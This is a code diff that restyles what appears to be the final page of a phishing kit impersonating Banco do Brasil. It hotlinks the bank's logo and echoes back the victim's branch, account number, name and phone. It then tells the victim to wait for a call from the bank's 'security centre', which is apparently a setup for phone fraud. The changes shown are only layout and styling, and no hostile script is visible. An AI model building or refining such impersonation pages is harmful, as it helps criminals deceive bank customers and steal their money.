@@ -11,50 +11,74 @@
             padding: 0;
             background-color: #f2f2f2;
             text-align: center;
-            padding-top: 50px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-color: #0047FF;
+            color: white;
+            border-bottom: 5px solid #FFD700;
+        }
+        .header img {
+            width: 80px;
+            border-radius: 50%;
+            margin-right: 20px;
+        }
+        .header h1 {
+            font-size: 24px;
+            margin: 0;
+            font-weight: bold;
         }
         .success-container {
             background-color: #FFD700;
-            padding: 50px;
+            padding: 40px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             max-width: 400px;
             margin: 50px auto;
         }
-        .success-container img {
-            width: 80px;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            background-color: #FFD700;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
         .container h1 {
             color: #0047FF;
+            font-size: 22px;
+        }
+        .container p {
+            font-size: 18px;
+            color: #333;
+            margin: 10px 0;
         }
         .container h4 {
             color: #0047FF;
+            font-size: 18px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-  <body>
-    <div class="success-container">
-        <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="BB Logo">
 
-    <div class="container">
-        <h1>Recebemos a sua Solicitação!</h1>
+    <div class="header">
+        <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="BB Logo">
+        <h1>Recebemos sua solicitação</h1>
+    </div>
+
+    <div class="success-container">
+        <h1>Detalhes do Cadastro</h1>
         <p><strong>Agência:</strong> <span id="agencia"></span></p>
         <p><strong>Conta:</strong> <span id="conta"></span></p>
         <p><strong>Nome:</strong> <span id="nome"></span></p>
-        <p><strong>Telefone:</strong> <span id="telefone"></span></p> <br><br>
+        <p><strong>Telefone:</strong> <span id="telefone"></span></p> 
+        <br><br>
         <h4>Aguarde o contato da Central de Segurança do Banco do Brasil</h4>
     </div>
-    <div class="footer">Obrigado por utilizar nossos serviços.</div>
+
+    <div class="footer">
+        Obrigado por utilizar nossos serviços.
+    </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
@@ -73,5 +97,6 @@
             }
         });
     </script>
+
 </body>
 </html>
